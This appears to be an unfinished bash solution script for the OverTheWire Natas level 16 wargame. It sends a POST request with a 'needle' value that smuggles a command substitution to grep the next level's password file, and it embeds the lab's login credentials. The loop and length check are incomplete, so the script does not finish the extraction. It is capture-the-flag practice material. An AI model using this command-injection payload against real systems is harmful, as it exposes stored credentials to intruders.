#!/bin/bash

chars={a..z}
password_17=""
for i in {0..1}
do
	#echo $password_17
	password_17+="$i"
	params="\$(grep ^b /etc/natas_webpass/natas17)"
	echo "Testing : "
	echo "needle=$params"

	line=`curl -u natas16:TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V -X POST -d "needle=\$(grep ^b /etc/natas_webpass/natas17)" http://natas16.natas.labs.overthewire.org`
	
	#echo Line: $line

#if [ line lt 25]
	#then

	#fi
done

echo $line
echo $password_17
